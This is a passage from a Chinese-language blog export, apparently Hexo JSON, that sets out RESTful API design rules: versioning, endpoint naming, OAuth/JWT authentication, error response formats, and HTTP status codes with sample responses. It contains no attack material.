chunked\nWWW-Authenticate: JWTAuth\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 13:17:02 GMT\nConnection: keep-alive\n\n\"message\":\"Token Signature could not be verified.\",\"error_code\": \"40100\"}\n```\n\n### 403 Forbidden\n\n该状态码可以简单的理解为没有权限访问该请求，服务器收到请求但拒绝提供服务。\n\n如当普通用户请求操作管理员用户时，必须 返回该状态码。\n\n```\nHTTP/1.1 403 Forbidden\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 13:05:34 GMT\nConnection: keep-alive\n\n{\"error_code\":40301,\"message\":\"权限不足\"}\n```\n\n### 404 Not Found\n\n该状态码表示用户请求的资源不存在，如\n\n- 获取不存在的用户信息 （get /users/9999999）\n- 访问不存在的端点\n\n都 必须 返回该状态码，若该资源已永久不存在，则 应该 返回 401 响应。\n\n### 405 Method Not Allowd\n\n当客户端使用的 HTTP 请求方法不被服务器允许时，必须 返回该状态码。\n\n> 如客户端调用了 POST 方法来访问只支持 GET 方法的 API\n\n该响应 必须 返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。\n\n```\nHTTP/1.1 405 Method Not Allowed\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nAllow: GET, HEAD\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 12:30:57 GMT\nConnection: keep-alive\n\n{\"message\":\"405 Method Not Allowed\",\"error_code\": 40500}\n```\n\n### 406 Not Acceptable\n\nAPI 在不支持客户端指定的数据格式时，应该返回此状态码。如支持 JSON 和 XML 输出的 API 被指定返回 YAML 格式的数据时。\n\n> Http 协议一般通过请求首部的 Accept 来指定数据格式\n\n### 408 Request Timeout\n\n客户端请求超时时 必须 返回该状态码，需要注意的时，该状态码表示 客户端请求超时，在涉及第三方 API 调用超时时，一定不可 返回该状态码。\n\n### 409 Gonfilct\n\n该状态码表示因为请求存在冲突无法处理。如通过手机号码提供注册功能的 API，当用户提交的手机号已存在时，必须 返回此状态码。\n\n```\nHTTP/1.1 409 Conflict\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 12:19:04 GMT\nConnection: keep-alive\n\n{\"error_code\":40900,\"message\":\"手机号已存在\"}\n```\n\n### 410 Gone\n\n和 404 类似，该状态码也表示请求的资源不存在，只是 410 状态码进一步表示所请求的资源已不存在，并且未来也不会存在。在收到 410 状态码后，客户端 应该 停止再次请求该资源。\n\n### 413 Request Entity Too Large\n\n该状态码表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。\n\n> 此种情况下，服务器可以关闭连接以免客户端继续发送此请求。\n\n如果这个状况是临时的，服务器 应该 返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。\n\n### 414 Request-URI Too Long\n\n该状态码表示请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。\n\n### 415 Unsupported Media Type\n\n通常表示服务器不支持客户端请求首部 Content-Type 指定的数据格式。如在只接受 JSON 格式的 API 中放入 XML 类型的数据并向服务器发送，都 应该 返回该状态码。\n\n该状态码也可用于如：只允许上传图片格式的文件，但是客户端提交媒体文件非法或不是图片类型，这时 应该 返回该状态码：\n\n```\nHTTP/1.1 415 Unsupported Media Type\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 12:09:40 GMT\nConnection: keep-alive\n\n{\"error_code\":41500,\"message\":\"不允许上传的图片格式\"}\n```\n\n### 429 Too Many Request\n\n该状态码表示用户请求次数超过允许范围。如 API 设定为 60次/分钟，当用户在一分钟内请求次数超过 60 次后，都 应该 返回该状态码。并且也 应该 在响应首部中加上下列头部：\n\n```\nX-RateLimit-Limit: 10 请求速率（由应用设定，其单位一般为小时/分钟等，这里是 10次/5分钟）\nX-RateLimit-Remaining: 0 当前剩余的请求数量\nX-RateLimit-Reset: 1529839462 重置时间\nRetry-After: 120 下一次访问应该等待的时间（秒）\n```\n\n列子\n\n```\nHTTP/1.1 429 Too Many Requests\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nX-RateLimit-Limit: 10\nX-RateLimit-Remaining: 0\nX-RateLimit-Reset: 1529839462\nRetry-After: 290\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 11:19:32 GMT\nConnection: keep-alive\n\n{\"message\":\"You have exceeded your rate limit.\",\"error_code\":42900}\n```\n\n必须 为所有的 API 设置 Rate Limit 支持。\n\n### 500 Internal Server Error\n\n该状态码 必须 在服务器出错时抛出，对于所有的 500 错误，都 应该 提供完整的错误信息支持，也方便跟踪调试。\n\n### 503 Service Unavailable\n\n该状态码表示服务器暂时处理不可用状态，当服务器需要维护或第三方 API 请求超时/不可达时，都 应该 返回该状态码，其中若是主动关闭 API 服务，应该在返回的响应首部加上 Retry-After 头部，表示多少秒后可以再次访问。\n\n```\nHTTP/1.1 503 Service Unavailable\nServer: nginx/1.11.9\nContent-Type: application/json\nTransfer-Encoding: chunked\nCache-Control: no-cache, private\nDate: Sun, 24 Jun 2018 10:56:20 GMT\nRetry-After: 60\nConnection: keep-alive\n\n{\"error_code\":50300,\"message\":\"服务维护中\"}\n```\n\n其他 HTTP 状态码请参考 [HTTP 状态码- 维基百科](https://link.juejin.im/?target=https%3A%2F%2Fzh.wikipedia.org%2Fzh-hans%2FHTTP%25E7%258A%25B6%25E6%2580%2581%25E7%25A0%2581)。\n","slug":"2019/6/RESETfulAPI设计规范","published":1,"updated":"2020-04-12T06:34:43.625Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzw001r44vqyov2iu83","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>工欲善其事，必先利其器，一个健壮的API必要有优秀的设计规范，本文是最基本的设计理念</p>\n<a id=\"more\"></a>\n<h3 id=\"协议\"><a href=\"#协议\" class=\"headerlink\" title=\"协议\"></a>协议</h3><p>在通过 API 于后端服务通信的过程中，应该 使用 HTTPS 协议。</p>\n<h3 id=\"API-Root-URL\"><a href=\"#API-Root-URL\" class=\"headerlink\" title=\"API Root URL\"></a>API Root URL</h3><p>API 的根入口点应尽可能保持足够简单，这里有两个常见的 URL 根例子：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">api<span class=\"selector-class\">.example</span><span class=\"selector-class\">.com</span><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">example.com/api/*</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果你的应用很庞大或者你预计它将会变的很庞大，那 应该 将 API 放到子域下。这种做法可以保持某些规模化上的灵活性。</p>\n</blockquote>\n<h3 id=\"Versioning\"><a href=\"#Versioning\" class=\"headerlink\" title=\"Versioning\"></a>Versioning</h3><p>所有的 API 必须保持向后兼容，你 必须 在引入新版本 API 的同时确保旧版本 API 仍然可用。所以 应该 为其提供版本支持。</p>\n<p>目前比较常见的两种版本号形式：</p>\n<p>在 URL 中嵌入版本编号<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">api<span class=\"selector-class\">.example</span><span class=\"selector-class\">.com</span>/v1<span class=\"comment\">/*</span></span><br></pre></td></tr></table></figure></p>\n<p>这种做法是版本号直观、易于调试；另一种做法是，将版本号放在 HTTP Header 头中：<br>通过媒体类型来指定版本信息<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Accept: application/vnd<span class=\"selector-class\">.example</span><span class=\"selector-class\">.com</span><span class=\"selector-class\">.v1</span>+json</span><br></pre></td></tr></table></figure></p>\n<p>其中 vnd 表示 Standards Tree 标准树类型，有三个不同的树: x，prs 和 vnd。你使用的标准树需要取决于你开发的项目</p>\n<ul>\n<li>未注册的树（x）主要表示本地和私有环境</li>\n<li>私有树（prs）主要表示没有商业发布的项目</li>\n<li>供应商树（vnd）主要表示公开发布的项目</li>\n</ul>\n<blockquote>\n<p>后面几个参数依次为应用名称（一般为应用域名）、版本号、期望的返回格式。</p>\n</blockquote>\n<h3 id=\"Endpoints\"><a href=\"#Endpoints\" class=\"headerlink\" title=\"Endpoints\"></a>Endpoints</h3><p>端点就是指向特定资源或资源集合的 URL。在端点的设计中，你 必须 遵守下列约定:</p>\n<ul>\n<li>URL 的命名 必须 全部小写</li>\n<li>URL 中资源（resource）的命名 必须 是名词，并且 必须 是复数形式</li>\n<li>必须 优先使用 Restful 类型的 URL</li>\n<li>URL 中不能出现 -，必须 用下划线 _ 代替</li>\n<li>URL 必须 是易读的</li>\n<li>URL 一定不可 暴露服务器架构</li>\n</ul>\n<h3 id=\"HTTP-动词\"><a href=\"#HTTP-动词\" class=\"headerlink\" title=\"HTTP 动词\"></a>HTTP 动词</h3><p>对于资源的具体操作类型，由 HTTP 动词表示。常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令）。</p>\n<ul>\n<li>GET（SELECT）：从服务器取出资源（一项或多项）。</li>\n<li>POST（CREATE）：在服务器新建一个资源。</li>\n<li>PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。</li>\n<li>PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。</li>\n<li>DELETE（DELETE）：从服务器删除资源。</li>\n</ul>\n<h3 id=\"Filtering\"><a href=\"#Filtering\" class=\"headerlink\" title=\"Filtering\"></a>Filtering</h3><blockquote>\n<p>如果记录数量很多，服务器不可能都将它们返回给用户。API 应该 提供参数，过滤返回结果。下面是一些常见的参数。</p>\n</blockquote>\n<ul>\n<li>?limit=10：指定返回记录的数量</li>\n<li>?offset=10：指定返回记录的开始位置。</li>\n<li>?page=2&amp;per_page=100：指定第几页，以及每页的记录数。</li>\n<li>?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。</li>\n<li>?animal_type_id=1：指定筛选条件</li>\n</ul>\n<p>所有 URL 参数 必须 是全小写，必须 使用下划线类型的参数形式。</p>\n<p>经常使用的、复杂的查询 应该 标签化，降低维护成本。如</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"builtin-name\">GET</span> /trades?<span class=\"attribute\">status</span>=closed&amp;sort=sortby=name&amp;order=asc</span><br><span class=\"line\"><span class=\"comment\"># 可为其定制快捷方式</span></span><br><span class=\"line\"><span class=\"builtin-name\">GET</span> /trades/recently_closed</span><br></pre></td></tr></table></figure>\n<h3 id=\"Authentication\"><a href=\"#Authentication\" class=\"headerlink\" title=\"Authentication\"></a>Authentication</h3><p>应该 使用 OAuth2.0 的方式为 API 调用者提供登录认证。必须 先通过登录接口获取 Access Token 后再通过该 token 调用需要身份认证的 API。</p>\n<p>Oauth 的端点设计示列</p>\n<ul>\n<li>RFC 6749   /token</li>\n<li>Twitter    /oauth2/token</li>\n<li>Fackbook   /oauth/access_token</li>\n<li>Google     /o/oauth2/token</li>\n<li>Github     /login/oauth/access_token</li>\n<li>Instagram  /oauth/authorize</li>\n</ul>\n<p>客户端在获得 access token 的同时 必须 在响应中包含一个名为 expires_in 的数据，它表示当前获得的 token 会在多少 秒 后失效。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"access_token\"</span>: <span class=\"string\">\"token....\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"token_type\"</span>: <span class=\"string\">\"Bearer\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"expires_in\"</span>: <span class=\"number\">3600</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>客户端在请求需要认证的 API 时，必须 在请求头 Authorization 中带上 access_token。</p>\n<figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">Authorization</span>: <span class=\"keyword\">Bearer </span>token...</span><br></pre></td></tr></table></figure>\n<p>当超过指定的秒数后，access token 就会过期，再次用过期/或无效的 token 访问时，服务端 应该 返回 invalid_token 的错误或 401 错误码。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">401</span> Unauthorized</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-store</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    \"error\": \"invalid_token\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Laravel 开发中，应该 使用 JWT 来为管理你的 Token，并且 一定不可 在 api 中间件中开启请求 session。</p>\n</blockquote>\n<h3 id=\"Response\"><a href=\"#Response\" class=\"headerlink\" title=\"Response\"></a>Response</h3><p>所有的 API 响应，必须 遵守 HTTP 设计规范，必须 选择合适的 HTTP 状态码。一定不可 所有接口都返回状态码为 200 的 HTTP 响应，如:</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">200</span> ok</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: example.com</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    \"code\": 0,</span><br><span class=\"line\">    \"msg\": \"success\",</span><br><span class=\"line\">    \"data\": &#123;</span><br><span class=\"line\">        \"username\": \"username\"</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>常见的 HTTP 状态码</p>\n<table>\n<thead>\n<tr>\n<th>状态码</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1xx</td>\n<td>代表请求已被接受，需要继续处理</td>\n</tr>\n<tr>\n<td>2xx</td>\n<td>请求已成功，请求所希望的响应头或数据体将随此响应返回</td>\n</tr>\n<tr>\n<td>3xx</td>\n<td>重定向</td>\n</tr>\n<tr>\n<td>4xx</td>\n<td>客户端引起的错误</td>\n</tr>\n<tr>\n<td>5xx</td>\n<td>服务端引起的错误</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>只有来自客户端的请求被正确的处理后才能返回 2xx 的响应，所以当 API 返回 2xx 类型的状态码时，前端 必须 认定该请求已处理成功。</p>\n</blockquote>\n<p>必须强调的是，所有 API 一定不可 返回 1xx 类型的状态码。当 API 发生错误时，必须 返回出错时的详细信息。目前常见返回错误信息的方法有两种：</p>\n<p>1、将错误详细放入 HTTP 响应首部；</p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X-MYNAME-<span class=\"built_in\">ERROR</span>-<span class=\"built_in\">CODE</span>: <span class=\"number\">4001</span></span><br><span class=\"line\">X-MYNAME-<span class=\"built_in\">ERROR</span>-MESSAGE: Bad authentication <span class=\"built_in\">token</span></span><br><span class=\"line\">X-MYNAME-<span class=\"built_in\">ERROR</span>-INFO: http:<span class=\"comment\">//docs.example.com/api/v1/authentication</span></span><br></pre></td></tr></table></figure>\n<p>2、直接放入响应实体中；</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">401</span> Unauthorized</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 10:02:59 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":40100,\"message\":\"Unauthorized\"&#125;</span><br></pre></td></tr></table></figure>\n<p>考虑到易读性和客户端的易处理性，我们 必须 把错误信息直接放到响应实体中，并且错误格式 应该 满足如下格式：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"message\"</span>: <span class=\"string\">\"您查找的资源不存在\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"error_code\"</span>: <span class=\"number\">404001</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>其中错误码（error_code）必须 和 HTTP 状态码对应，也方便错误码归类，如：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">429</span> Too Many Requests</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 10:15:52 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":429001,\"message\":\"你操作太频繁了\"&#125;</span><br></pre></td></tr></table></figure>\n<p>应该 在返回的错误信息中，同时包含面向开发者和面向用户的提示信息，前者可方便开发人员调试，后者可直接展示给终端用户查看如：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"message\"</span>: <span class=\"string\">\"直接展示给终端用户的错误信息\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"error_code\"</span>: <span class=\"string\">\"业务错误码\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"error\"</span>: <span class=\"string\">\"供开发者查看的错误信息\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"debug\"</span>: [</span><br><span class=\"line\">        <span class=\"string\">\"错误堆栈，必须开启 debug 才存在\"</span></span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>下面详细列举了各种情况 API 的返回说明。</p>\n<h3 id=\"200-ok\"><a href=\"#200-ok\" class=\"headerlink\" title=\"200 ok\"></a>200 ok</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">200 状态码是最常见的 HTTP 状态码，在所有 成功 的 <span class=\"builtin-name\">GET</span> 请求中，必须 返回此状态码。HTTP 响应实体部分 必须 直接就是数据，不要做多余的包装。</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"data\"</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>: 1,</span><br><span class=\"line\">            <span class=\"string\">\"avatar\"</span>: <span class=\"string\">\"https://lorempixel.com/640/480/?32556\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"nickname\"</span>: <span class=\"string\">\"fwest\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"last_logined_time\"</span>: <span class=\"string\">\"2018-05-29 04:56:43\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"has_registed\"</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>: 2,</span><br><span class=\"line\">            <span class=\"string\">\"avatar\"</span>: <span class=\"string\">\"https://lorempixel.com/640/480/?86144\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"nickname\"</span>: <span class=\"string\">\"zschowalter\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"last_logined_time\"</span>: <span class=\"string\">\"2018-06-16 15:18:34\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"has_registed\"</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">\"meta\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">\"pagination\"</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">\"total\"</span>: 101,</span><br><span class=\"line\">            <span class=\"string\">\"count\"</span>: 2,</span><br><span class=\"line\">            <span class=\"string\">\"per_page\"</span>: 2,</span><br><span class=\"line\">            <span class=\"string\">\"current_page\"</span>: 1,</span><br><span class=\"line\">            <span class=\"string\">\"total_pages\"</span>: 51,</span><br><span class=\"line\">            <span class=\"string\">\"links\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"next\"</span>: <span class=\"string\">\"http://api.example.com?page=2\"</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>其中，分页和其他额外的媒体信息，必须放到 meta 字段中。</p>\n</blockquote>\n<h3 id=\"201-Created\"><a href=\"#201-Created\" class=\"headerlink\" title=\"201 Created\"></a>201 Created</h3><p>当服务器创建数据成功时，应该 返回此状态码。常见的应用场景是使用 POST 提交用户信息，如：</p>\n<ul>\n<li>添加了新用户</li>\n<li>上传了图片</li>\n<li>创建了新活动</li>\n</ul>\n<p>等，都可以返回 201 状态码。需要注意的是，你可以选择在用户创建成功后返回新用户的数据</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">201</span> Created</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 09:13:40 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    \"id\": 1,</span><br><span class=\"line\">    \"avatar\": \"https:\\/\\/lorempixel.com\\/640\\/480\\/?32556\",</span><br><span class=\"line\">    \"nickname\": \"fwest\",</span><br><span class=\"line\">    \"last_logined_time\": \"2018-05-29 04:56:43\",</span><br><span class=\"line\">    \"created_at\": \"2018-06-16 17:55:55\",</span><br><span class=\"line\">    \"updated_at\": \"2018-06-16 17:55:55\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>也可以返回一个响应实体为空的 HTTP Response 如：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">201</span> Created</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: text/html; charset=UTF-8</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 09:12:20 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里我们 应该 采用第二种方式，因为大多数情况下，客户端只需要知道该请求操作成功与否，并不需要返回新资源的信息。</p>\n</blockquote>\n<h3 id=\"202-Accepted\"><a href=\"#202-Accepted\" class=\"headerlink\" title=\"202 Accepted\"></a>202 Accepted</h3><p>该状态码表示服务器已经接受到了来自客户端的请求，但还未开始处理。常用短信发送、邮件通知、模板消息推送等这类很耗时需要队列支持的场景中；</p>\n<blockquote>\n<p>返回该状态码时，响应实体 必须 为空。</p>\n</blockquote>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">202</span> Accepted</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: text/html; charset=UTF-8</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 09:25:15 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure>\n<h3 id=\"204-No-Content\"><a href=\"#204-No-Content\" class=\"headerlink\" title=\"204 No Content\"></a>204 No Content</h3><p>该状态码表示响应实体不包含任何数据，其中：</p>\n<p>在使用 DELETE 方法删除资源 成功 时，必须 返回该状态码<br>使用 PUT、PATCH 方法更新数据 成功 时，也 应该 返回此状态码</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">204</span> No Content</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 09:29:12 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure>\n<h3 id=\"3xx-重定向\"><a href=\"#3xx-重定向\" class=\"headerlink\" title=\"3xx 重定向\"></a>3xx 重定向</h3><p>所有 API 一定不可 返回 3xx 类型的状态码。因为 3xx 类型的响应格式一般为下列格式:</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 